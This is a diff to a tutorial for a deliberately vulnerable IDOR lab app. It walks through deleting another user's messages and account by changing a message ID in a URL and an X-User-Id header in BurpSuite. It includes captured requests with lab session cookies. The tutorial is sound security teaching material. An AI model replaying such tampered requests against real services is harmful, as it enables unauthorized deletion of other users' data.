@@ -80,8 +80,26 @@ This occurs when an attacker alters HTTP headers (e.g., cookies or tokens) to by
 - **Example**:  
 A web app uses a cookie to identify the user:
 
-### **4. Reference Maps**  
-The application uses client-side maps or caches that can be manipulated to reference unauthorized objects.
+---
+
+## 4. Body Manipulation
+This involves tampering with the request body (e.g., JSON or form data) to reference objects the attacker shouldn’t access.
+
+- **Example**:  
+An API endpoint allows profile updates via a POST request:  
+```json
+{
+  "user_id": "101",
+  "email": "user@example.com"
+}
+```
+An attacker modifies the user_id:
+```json
+{
+  "user_id": "102",
+  "email": "attacker@example.com"
+}
+```
 
 ## **Impact of IDOR Vulnerabilities**
 
@@ -96,33 +114,33 @@ The application uses client-side maps or caches that can be manipulated to refer
 1. **Pull the Docker Image**
 
    ```bash
-   docker pull yourusername/idor-lab:latest
+   docker pull yeasin97/idor-lab1:latest
    ```
 
 2. **Run the Docker Container**
 
    ```bash
-   docker run -d -p 5000:5000 yourusername/idor-lab:latest
+   docker run -d -p 5000:5000 yeasin97/idor-lab1:latest
    ```
 
 3. **Create a Load Balancer in Poridhi's Cloud**
 
    Find the `eth0` IP address with `ifconfig` command.
 
-   ![ifconfig output]
-   *(Suggested image: Screenshot showing the result of the ifconfig command with eth0 IP highlighted)*
+   ![ifconfig output](assets/ifconfig.png)
+   
 
    Create a Load Balancer with the `eth0 IP` address and the port `5000`
 
-   ![Load Balancer Creation]
-   *(Suggested image: Screenshot of load balancer configuration page)*
+   ![Load Balancer Creation](assets/loadb.png)
+
    
 4. **Access the Web Application**
 
    Access the web application with the URL provided by the `loadbalancer`
 
-   ![Application Login Page]
-   *(Suggested image: Screenshot of the application's login page)*
+   ![Application Login Page](assets/home.png)
+   
    
 ### **Exploring the Application**
 
@@ -132,31 +150,10 @@ This web app is designed to demonstrate IDOR vulnerabilities. It allows users to
 2. Login as "User1" and create a message
 3. Note how the application uses numeric IDs in the URLs and for referencing resources
 
-![User Dashboard]
-*(Suggested image: Screenshot of the user dashboard showing the message list)*
+![User Dashboard](assets/messageuser1.png)
 
-### **Setting Up BurpSuite for Traffic Interception**
+![User Dashboard](assets/messageuser12.png)
 
-BurpSuite is a powerful web application security testing tool that allows you to intercept and modify HTTP/HTTPS traffic between your browser and the application server.
-
-1. **Configure Browser to Use BurpSuite Proxy**
-   - Set up your browser to use the proxy at `127.0.0.1:8080`
-   
-   ![Browser Proxy Settings]
-   *(Suggested image: Screenshot of browser proxy configuration)*
-
-2. **Start BurpSuite and Configure the Proxy**
-   - Open BurpSuite and go to the Proxy tab
-   - Ensure Intercept is on
-   
-   ![BurpSuite Proxy Setup]
-   *(Suggested image: Screenshot of BurpSuite proxy tab with intercept enabled)*
-
-3. **Install BurpSuite CA Certificate**
-   - Navigate to http://burp to download and install the Burp CA certificate in your browser
-   
-   ![BurpSuite Certificate Installation]
-   *(Suggested image: Screenshot showing the certificate installation process)*
 
 ### **Exploiting the IDOR Vulnerability**
 
@@ -167,31 +164,39 @@ Let's exploit the IDOR vulnerability in the message deletion functionality:
 1. Login as "User1" and create a message
 2. Note the message ID in the URL when viewing the message
 3. Login as "User2" and create another message
+
+![User Dashboard](assets/user2message.png)
+
 4. With BurpSuite running, try to delete "User1"'s message as "User2"
 
-**Step 1:** Click the delete button for your own message and capture the request in BurpSuite
+**Step 1:** Click the delete button for your own message and capture the request in BurpSuite and sent it to repeater.
 
-![BurpSuite Request Capture]
-*(Suggested image: Screenshot of BurpSuite showing the intercepted delete request)*
+![BurpSuite Request Capture](assets/message3dlt.png)
+
 
 **Step 2:** Observe the request structure:
 ```
-GET /delete_message/2 HTTP/1.1
-Host: example.com
-Cookie: session=abc123...
+GET /delete_message/3 HTTP/1.1
+Host: 678aa840859cc728c0ad9211-lb-732.bm
+Cookie: session=eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6IlVzZXIyIn0.Z92edQ.4TuLxICSCHi3qMS0suI3w4Jp41g
 ```
 
 **Step 3:** Modify the message ID to target "User1"'s message:
 ```
 GET /delete_message/1 HTTP/1.1
-Host: example.com
-Cookie: session=abc123...
+Host: 678aa840859cc728c0ad9211-lb-732.bm-north.lab.poridhi.io
+Cookie: session=eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6IlVzZXIyIn0.Z92edQ.4TuLxICSCHi3qMS0suI3w4Jp41g
 ```
+
+Repeat for the message 2 as well.
 
 **Step 4:** Forward the modified request and observe that you can delete another user's message without proper authorization!
 
-![Successful IDOR Exploitation]
-*(Suggested image: Screenshot showing successful deletion of another user's message)*
+![Successful IDOR Exploitation](assets/message1dlt.png)
+
+Reload the home page and see User1's messages are deleted.
+
+![Successful IDOR Exploitation](assets/successmessage.png)
 
 #### **2. Account Deletion IDOR**
 
@@ -200,30 +205,44 @@ The application also has an IDOR vulnerability in the account deletion functiona
 1. Login as "User2"
 2. Navigate to the profile page
 3. With BurpSuite running, initiate an account deletion request for your own account
+
+![Self delete](assets/change.png)
+
 4. Modify the request to target "User1"'s account
 
 **Step 1:** Click "Delete Account" and capture the request in BurpSuite:
 ```
-POST /delete_account HTTP/1.1
-Host: example.com
-Content-Type: application/x-www-form-urlencoded
-Cookie: session=xyz789...
-X-User-ID: 2
+POST /delete_account HTTP/2
+Host: 678aa840859cc728c0ad9211-lb-732.bm-north.lab.poridhi.io
+Cookie: session=eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6IlVzZXIyIn0.Z92faQ.kWL53TI1IuKsU8CaSwZ-CO3Bs4g
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://678aa840859cc728c0ad9211-lb-732.bm-north.lab.poridhi.io/profile
+X-User-Id: 2
 ```
 
 **Step 2:** Modify the X-User-ID header to target "User1":
 ```
-POST /delete_account HTTP/1.1
-Host: example.com
-Content-Type: application/x-www-form-urlencoded
-Cookie: session=xyz789...
-X-User-ID: 1
+POST /delete_account HTTP/2
+Host: 678aa840859cc728c0ad9211-lb-732.bm-north.lab.poridhi.io
+Cookie: session=eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6IlVzZXIyIn0.Z92faQ.kWL53TI1IuKsU8CaSwZ-CO3Bs4g
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://678aa840859cc728c0ad9211-lb-732.bm-north.lab.poridhi.io/profile
+X-User-Id: 1
 ```
 
 **Step 3:** Forward the modified request and observe that you can delete another user's account!
 
-![Account Deletion IDOR]
-*(Suggested image: Screenshot showing successful deletion of another user's account)*
+![Account Deletion IDOR](assets/repeat1.png)
+
+Send it again to ensure its deleted when you see the "Not found" response.
+
+![Account Deletion IDOR](assets/repeat2.png)
 
 ## **How to Prevent IDOR Vulnerabilities**
 
